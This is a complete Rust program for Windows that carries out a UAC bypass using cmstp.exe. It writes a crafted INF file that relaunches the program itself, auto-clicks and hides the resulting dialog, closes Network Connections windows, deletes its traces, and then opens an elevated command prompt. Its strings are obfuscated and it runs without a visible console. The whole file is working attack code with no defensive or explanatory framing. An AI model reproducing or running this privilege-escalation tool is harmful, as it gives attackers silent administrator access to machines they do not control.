#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;

use obfstr::obfstr;
use windows::core::{PCWSTR, PWSTR};
use windows::Win32::Foundation::*;
use windows::Win32::Security::*;
use windows::Win32::System::Threading::*;
use windows::Win32::UI::WindowsAndMessaging::*;

const BM_CLICK: u32 = 0x00F5;

unsafe fn close_network_connections_window() {
    let cabinet_w = wz("CabinetWClass");
    let mut hw = GetTopWindow(HWND::default()).unwrap_or_default();
    while !hw.0.is_null() {
        let mut class_buf = [0u16; 64];
        let clen = GetClassNameW(hw, &mut class_buf);
        if clen > 0 {
            let class = String::from_utf16_lossy(&class_buf[..clen as usize]);
            if class == "CabinetWClass" {
                let mut title_buf = [0u16; 256];
                let tlen = GetWindowTextW(hw, &mut title_buf);
                if tlen > 0 {
                    let title = String::from_utf16_lossy(&title_buf[..tlen as usize]);
                    if title.contains("Network") {
                        let _ = ShowWindow(hw, SW_HIDE);
                        let _ = PostMessageW(hw, WM_CLOSE, WPARAM(0), LPARAM(0));
                    }
                }
            }
        }
        hw = GetWindow(hw, GET_WINDOW_CMD(2)).unwrap_or_default();
    }
}

fn wz(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

fn is_elevated() -> bool {
    unsafe {
        let mut tok = HANDLE::default();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut tok).is_err() {
            return false;
        }
        let mut elev = TOKEN_ELEVATION::default();
        let mut n = 0u32;
        let ok = GetTokenInformation(
            tok,
            TokenElevation,
            Some(&mut elev as *mut _ as *mut _),
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut n,
        )
        .is_ok();
        let _ = CloseHandle(tok);
        ok && elev.TokenIsElevated != 0
    }
}

fn elevated_payload() {
    unsafe {
        let tk = obfstr!("C:\\Windows\\System32\\taskkill.exe").to_owned();
        let mut tk_cmd = wz(&format!("\"{}\" /F /IM cmstp.exe /T", tk)); // this fix profile damage on close
        let mut si2: STARTUPINFOW = std::mem::zeroed();
        si2.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi2 = PROCESS_INFORMATION::default();
        if CreateProcessW(
            PCWSTR::null(),
            PWSTR(tk_cmd.as_mut_ptr()),
            None, None, false,
            CREATE_NO_WINDOW,
            None, None, &si2, &mut pi2,
        ).is_ok() {
            WaitForSingleObject(pi2.hProcess, 2000);
            let _ = CloseHandle(pi2.hProcess);
            let _ = CloseHandle(pi2.hThread);
        }

        let exe = wz("cmd.exe");
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi = PROCESS_INFORMATION::default();
        if CreateProcessW(
            PCWSTR(exe.as_ptr()),
            PWSTR::null(),
            None,
            None,
            false,
            CREATE_NEW_CONSOLE,
            None,
            None,
            &si,
            &mut pi,
        )
        .is_ok()
        {
            let _ = CloseHandle(pi.hProcess);
            let _ = CloseHandle(pi.hThread);
        }
    }
}

fn cmstp_bypass() {
    let self_path = match std::env::current_exe() {
        Ok(p) => p.to_string_lossy().into_owned(),
        Err(_) => return,
    };

    let tmp = std::env::temp_dir();
    let pid = unsafe { GetCurrentProcessId() };
    let inf_path = tmp.join(format!("cmstp{}.inf", pid));

    let service_name = obfstr!("NetworkInstall").to_owned();
    let inf_content = format!(
        "[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n\
         [DefaultInstall]\r\nCustomDestination=DestPaths\r\n\
         RunPreSetupCommands=ExecSetup\r\n\r\n\
         [ExecSetup]\r\n\
         \"{}\" /setup\r\n\r\n\
         [DestPaths]\r\n\
         49000,49001=DirMap, 7\r\n\r\n\
         [DirMap]\r\n\
         \"HKLM\", \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\r\n\r\n\
         [Strings]\r\n\
         ServiceName=\"{}\"\r\n\
         ShortSvcName=\"{}\"\r\n",
        self_path, service_name, service_name
    );

    if std::fs::write(&inf_path, inf_content.as_bytes()).is_err() {
        return;
    }

    let cmstp = obfstr!("C:\\Windows\\System32\\cmstp.exe").to_owned();
    let mut cmd = wz(&format!(
        "\"{}\" /au \"{}\"",
        cmstp,
        inf_path.to_string_lossy()
    ));

    let (launched, cmstp_handle) = unsafe {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi = PROCESS_INFORMATION::default();
        let ok = CreateProcessW(
            PCWSTR::null(),
            PWSTR(cmd.as_mut_ptr()),
            None,
            None,
            false,
            PROCESS_CREATION_FLAGS(0),
            None,
            None,
            &si,
            &mut pi,
        )
        .is_ok();
        if ok {
            let _ = CloseHandle(pi.hThread);
            (true, pi.hProcess)
        } else {
            (false, HANDLE::default())
        }
    };

    if !launched {
        let _ = std::fs::remove_file(&inf_path);
        return;
    }

    let class_w = wz(&service_name);
    let ok_w = wz(obfstr!("OK"));

    unsafe {
        for _ in 0..500u32 {
            let mut hwnd = FindWindowW(PCWSTR(class_w.as_ptr()), PCWSTR::null())
                .unwrap_or_default();
            if hwnd.0.is_null() {
                hwnd = FindWindowW(PCWSTR::null(), PCWSTR(class_w.as_ptr()))
                    .unwrap_or_default();
            }

            if !hwnd.0.is_null() {
                ShowWindow(hwnd, SW_HIDE);
                if let Ok(ok_btn) = FindWindowExW(hwnd, HWND::default(), PCWSTR::null(), PCWSTR(ok_w.as_ptr())) {
                    if !ok_btn.0.is_null() {
                        SendMessageW(ok_btn, BM_CLICK, WPARAM(0), LPARAM(0));
                    }
                }
                break;
            }

            std::thread::sleep(std::time::Duration::from_millis(10));
        }
    }

    unsafe {
        if !cmstp_handle.is_invalid() {
            let _ = CloseHandle(cmstp_handle);
        }
    }

    unsafe {
        for _ in 0..500u32 {
            close_network_connections_window();
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
    }

    let _ = std::fs::remove_file(&inf_path);
}

fn main() {
    let reentry = std::env::args().any(|a| a == "/setup");
    if reentry || is_elevated() {
        elevated_payload();
    } else {
        cmstp_bypass();
    }
}
